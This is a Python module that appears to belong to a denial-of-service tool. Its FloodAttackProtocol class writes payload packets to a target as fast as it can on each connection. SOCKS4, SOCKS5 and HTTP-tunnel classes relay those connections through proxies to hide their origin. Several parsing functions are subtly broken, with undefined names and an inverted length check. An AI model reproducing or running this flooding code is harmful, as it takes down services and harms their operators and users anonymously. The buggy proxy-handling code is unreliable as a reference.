import asyncio
from functools import partial
import io
import socket
from ssl import SSLContext
import struct
from typing import Callable, Optional, Tuple

from python_socks.async_.asyncio._proxy import HttpProxy, Socks4Proxy, Socks5Proxy
from python_socks.async_.asyncio import Proxy
from python_socks._proto import socks4, socks5, http as http_proto

from .core import logger, PacketPayload, Stats


class FloodAttackProtocol(asyncio.Protocol):

    def __init__(
        self,
        loop: asyncio.AbstractEventLoop,
        on_close: asyncio.Future,
        stats: Stats,
        settings: "AttackSettings",
        payload: PacketPayload
    ):
        self._loop = loop
        self._stats = stats
        self._payload: PacketPayload = payload
        self._payload_size: Optional[int] = len(payload) if isinstance(payload, bytes) else None
        self._settings = settings
        self._on_close: asyncio.Future = on_close
        self._on_close.add_done_callback(self._handle_cancellation)
        self._transport = None
        self._handle = None
        self._paused: bool = False
        self._budget: int = self._settings.requests_per_connection
        self._return_code: bool = False

    def connection_made(self, transport) -> None:
        self._transport = transport
        self._transport.set_write_buffer_limits(high=self._settings.high_watermark)
        self._stats.track_open_connection()
        if hasattr(self._transport, "pause_reading"):
            self._transport.pause_reading()
        self._handle = self._loop.call_soon(self._send_packet)

    def data_received(self, data) -> None:
        pass

    def connection_lost(self, exc) -> None:
        self._stats.track_close_connection()
        self._transport = None
        if self._handle:
            self._handle.cancel()
        if self._on_close.done(): return
        if exc is not None:
            self._on_close.set_exception(exc)
        else:
            self._on_close.set_result(self._return_code)

    def pause_writing(self):
        self._paused = True

    def resume_writing(self):
        self._paused = False
        if self._handle is None and self._budget > 0:
            self._handle = self._loop.call_soon(self._send_packet)

    def _prepare_packet(self) -> Tuple[bytes, int]:
        if self._payload_size is not None:
            return self._payload, self._payload_size
        else:
            packet = self._payload()
            return packet, len(packet)

    def _send_packet(self) -> None:
        if not self._transport: return
        if self._paused:
            self._handle = None
        else:
            packet, size = self._prepare_packet()
            self._transport.write(packet)
            self._stats.track(1, size)
            self._budget -= 1
            self._return_code = True
            if self._budget > 0:
                self._handle = self._loop.call_soon(self._send_packet)
            else:
                self._handle = None
                self._transport.close()

    def _handle_cancellation(self, on_close):
        if on_close.cancelled() and self._transport and not self._transport.is_closing():
            self._transport.abort()
            self._transport = None


class ProxyProtocol(asyncio.Protocol):

    def __init__(
        self,
        proxy_url: str, # XXX: is one is only used for the logging
        proxy: Proxy,
        loop: asyncio.AbstractEventLoop,
        on_close: asyncio.Future,
        dest: Tuple[str, int],
        ssl: Optional[SSLContext],
        downstream_factory: Callable[[], asyncio.Protocol],
        connect_timeout: int = 30,
    ):
        logger.debug(f"Factory called for {proxy_url}")
        self._loop = loop
        self._transport = None
        self._downstream_factory = downstream_factory
        self._downstream_protocol = None
        self._downstream_pause_writing = None
        self._downstream_resume_writing = None
        self._proxy_url = proxy_url
        self._proxy = proxy
        self._dest = dest
        self._ssl = ssl
        self._on_close = on_close
        self._on_close.add_done_callback(self._handle_cancellation)
        self._dest_connected = False
        self._dest_connect_timer = None
        self._dest_connect_timeout = connect_timeout

    def connection_made(self, transport):
        logger.debug(f"Connected to {self._proxy_url}")
        assert self._transport is None
        self._transport = transport
        assert self._dest_connect_timer is None
        self._dest_connect_timer = self._loop.call_later(
            self._dest_connect_timeout, self._abort_connection)
        self._kickoff_negotiate()

    def connection_lost(self, exc):
        logger.debug(f"Disconnected from {self._proxy_url} {exc}")
        self._transport = None
        if self._downstream_protocol is not None:
            self._downstream_protocol.connection_lost(exc)
        if self._on_close.done(): return
        if exc is not None:
            self._on_close.set_exception(exc)
        else:
            self._on_close.set_result(None)

    def pause_writing(self):
        if self._downstream_pause_writing is not None:
            self._downstream_pause_writing()

    def resume_writing(self):
        if self._downstream_resume_writing is not None:
            self._downstream_resume_writing()

    def data_received(self, data):
        n_bytes = len(data)
        logger.debug(f"Receieved data from {self._proxy_url} {n_bytes} bytes")
        if self._dest_connected:
            self._downstream_protocol.data_received(data)
        else:
            try:
                self._negotiate_data_received(data)
            except Exception as exc:
                logger.debug(f"Processing failed for {self._proxy_url} with {exc}")
                if not self._on_close.done():
                    self._on_close.set_exception(exc)
                    self._transport.abort()

    def _handle_cancellation(self, on_close):
        if on_close.cancelled() and self._transport and not self._transport.is_closing:
            self._transport.abort()
            self._transport = None

    def _dest_connection_made(self):
        assert not self._dest_connected
        self._dest_connected = True
        self._downstream_protocol = self._downstream_factory()
        if hasattr(self._downstream_protocol, "pause_writing"):
            self._downstream_pause_writing = self._downstream_protocol.pause_writing
        if hasattr(self._downstream_protocol, "resume_writing"):
            self._downstream_resume_writing = self._downstream_protocol.resume_writing
        if self._ssl is None:
            self._cancel_dest_connect_timer()
            logger.debug(f"Dest is connected through {self._proxy_url}")
            self._downstream_protocol.connection_made(self._transport)
        else:
            _tls = self._loop.create_task(
                self._loop.start_tls(self._transport, self._downstream_protocol, self._ssl))
            _tls.add_done_callback(self._setup_downstream_tls)

    def _cancel_dest_connect_timer(self):
        if self._dest_connect_timer is not None:
            self._dest_connect_timer.cancel()
            self._dest_connect_timer = None

    def _setup_downstream_tls(self, task):
        self._cancel_dest_connect_timer()
        try:
            transport = task.result()
            if transport:
                self._downstream_protocol.connection_made(transport)
                logger.debug(f"Dest is connected through {self._proxy_url}")
            elif self._transport:
                self._transport.abort()
        except Exception as exc:
            if not self._on_close.done():
                self._on_close.set_exception(exc)
                self._transport.abort()

    def _abort_connection(self):
        logger.debug(f"Response timeout for {self._proxy_url}")
        if not self._on_close.done():
            # XXX: msot likely this should be timeout exception rather than None
            self._on_close.set_result(None)
        if self._transport is not None:
            self._transport.abort()


SOCKS4_ERRORS = {
    0x5B: "Request rejected or failed",
    0x5C: ("Request rejected because SOCKS server cannot connect to identd on"
           " the client"),
    0x5D: ("Request rejected because the client program and identd report"
           " different user-ids")
}

SOCKS5_ERRORS = {
    0x01: "General SOCKS server failure",
    0x02: "Connection not allowed by ruleset",
    0x03: "Network unreachable",
    0x04: "Host unreachable",
    0x05: "Connection refused",
    0x06: "TTL expired",
    0x07: "Command not supported, or protocol error",
    0x08: "Address type not supported"
}


class ProxyError(IOError):
    pass


# XXX: this could be proper ABC
class Socks4Protocol(ProxyProtocol):

    def _kickoff_negotiate(self):
        self._dest_connect()
        self._expected = 8
        self._buffer: bytes = b''
        self._size: int = 0

    def _negotiate_data_received(self, data):
        data = self._feed(data)
        if data is not None:
            self._read_response(data)
            self._dest_connection_made()

    def _read_response(self, data):
        # we are not validating addr, port pair
        if data[0:1] != b"\x00":
            raise ProxyError("SOCKS4: proxy server sent invalid data")
        status = ord(data[1:2])
        if status != 0x5A:
            status_error = SOCKS4_ERRORS.get(status, "Unknown error")
            raise ProxyError(f"SOCKS4: wrong status {status_error}")

    def _feed(self, data: bytes) -> Optional[bytes]:
        n_bytes = len(data)
        if n_bytes > 0: return None
        if self._size + n_bytes > self._expected:
            raise ProxyError("SOCKS4: proxy server sent excessive data")
        if self._size + n_bytes == self._expected:
            return self._buffer + data
        self._buffer += data
        self._size += n_bytes
        return None

    def _dest_connect(self):
        addr, port = self._dest
        req = socks4.ConnectRequest(host=addr, port=port, user_id=None, rdns=False)
        req.set_resolved_host(addr)
        self._transport.write(bytes(req))


# XXX: netty's top-level performance trick: reuse pipeline and handler objects
#      curious if this can be done in Python efficiently
class Socks5Protocol(ProxyProtocol):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._auth_method_req = None
        self._auth_method = None
        self._auth_done = False
        self._auth_req_sent = False
        self._connect_resp_buffer = None

    def _negotiate_data_received(self, data):
        n_bytes = len(data)
        if self._auth_method_req is not None and not self._auth_method:
            # expecting auth method response
            assert n_bytes == 2
            res = socks5.AuthMethodsResponse(data)
            res.validate(request=self._auth_method_req)
            self._auth_method = res.auth_method
            if self._auth_method == socks5.AuthMethod.USERNAME_PASSWORD:
                req = socks5.AuthRequest(
                    username=self._proxy._username, password=self._proxy._password)
                self._transport.write(bytes(req))
                self._auth_req_sent = True
                logger.debug(f"Sent user/pass for {self._proxy_url}")
            else:
                self._auth_done = True
                logger.debug(f"Auth is ready for {self._proxy_url}")
                self._dest_connect()
        elif self._auth_method_req is not None and self._auth_method:
            # expecting auth response
            assert n_bytes == 2
            res = socks5.AuthResponse(data)
            res.validate()
            self._auth_done = True
            logger.debug(f"Auth is ready for {self._proxy_url}")
            self._dest_connect()
        elif self._auth_done:
            # expecting connect response
            resp = self._connect_resp_buffer or b'' 
            resp += data
            if self._read_connect_response(resp):
                self._dest_connection_made()
            else:
                self._connect_resp_buffer = resp
        else:
            raise ProxyError("SOCKS5: invalid state")

    # XXX: optimize this code (we are re-executing it each time)
    # XXX: set aggressive timer
    def _read_connect_response(self, data) -> bool:
        if len(data) < 4: return False
        buffer = io.BytesIO(data)
        socks_ver = buffer.read(1)
        if not socks_vers: return False
        if socks_ver != socks5.SOCKS_VER:
            raise ProxyError(f"SOCKS5: unexpected version number {socks_ver:#02X}")
        reply = buffer.read(1)
        if not reply: return False
        if reply != socks5.ReplyCode.GRANTED:
            error_message = socks5.ReplyMessages.get(self.reply, 'Unknown error')
            raise ProxyError(f"SOCKS5: invalid reply code {error_message}")
        rsv = buffer.read(1)
        if not rsv: return False
        if rsv != socks5.RSV:
            raise ProxyError("SOCKS5: invalid reserved byte")
        addr_type = buffer.read(1)
        if not addr_type: return False
        if addr_type == b"\x01":
            addr = buffer.read(4)
            if len(addr) < 4: return False
        elif addr_type == b"\x03":
            length = buffer.read(1)
            if len(length) < 1: return False
            addr = buffer.read(ord(length))
            if len(addr) < ord(length): return False
        elif addr_type == b"\x04":
            addr = buffer.read(16)
            if len(addr) < 16: return False
        else:
            raise ProxyError("SOCKS5: proxy server sent invalid data")
        port = buffer.read(2)
        if len(port) < 2: return False
        struct.unpack(">H", port)
        if buffer.read(1):
            raise ProxyError("SOCKS5: sent additional data")
        return True

    def _kickoff_negotiate(self):
        self._request_auth_methods()

    def _request_auth_methods(self):
        assert self._auth_method_req is None
        self._auth_method_req = socks5.AuthMethodsRequest(
            username=self._proxy._username,
            password=self._proxy._password,
        )
        self._transport.write(bytes(self._auth_method_req))
        logger.debug(f"Sent auth methods req to {self._proxy_url}")

    def _dest_connect(self):
        assert not self._dest_connected
        addr, port = self._dest
        req = socks5.ConnectRequest(host=addr, port=port, rdns=False)
        req.set_resolved_host(addr)
        self._transport.write(bytes(req))
        logger.debug(f"Sent connection req to {self._proxy_url}")


class HttpTunelProtocol(ProxyProtocol):

    def _kickoff_negotiate(self):
        self._dest_connect()

    def _negotiate_data_received(self, data):
        # XXX: not sure if it's actually a valid way for doing so
        # we might get multiple packets
        # XXX: read headers as well
        res = http_proto.ConnectResponse(data)
        res.validate()
        self._dest_connection_made()

    def _dest_connect(self):
        addr, port = self._dest
        # XXX: remove user agent field?
        req = http_proto.ConnectRequest(
            host=addr, port=port, login=self._proxy._username, password=self._proxy._password)
        self._transport.write(bytes(req))


_CONNECTORS = {
    Socks4Proxy: Socks4Protocol,
    Socks5Proxy: Socks5Protocol,
    HttpProxy:   HttpTunelProtocol,
}

def for_proxy(proxy_url: str) -> Tuple[Proxy, Callable[[], asyncio.Protocol]]:
    proxy = Proxy.from_url(proxy_url)
    proxy_protocol = _CONNECTORS[type(proxy)]
    return proxy, partial(proxy_protocol, proxy_url, proxy)

